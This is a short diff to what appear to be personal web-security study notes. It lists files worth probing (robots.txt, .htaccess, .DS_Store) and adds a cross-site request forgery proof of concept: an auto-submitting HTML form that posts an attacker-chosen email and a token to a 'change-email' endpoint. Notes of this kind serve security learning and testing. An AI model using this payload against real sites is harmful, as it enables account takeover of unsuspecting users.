@@ -3,3 +3,15 @@
 keep Google from indexing website : robots.txt
 apache : /.htaccess
 stored on mac : .DS_Store
+
+
+
+CSRF : 
+// when csrf is being checked if it exists
+<form method="POST" action="website.com/account/change-email">
+<input name="email" value="tester@gmail.com">
+<input name="csrf" value="ibPSWKsO1P6UhEt07y7azw48JeRXRtiJ">
+</form>
+<script>
+    document.forms[0].submit();
+</script>
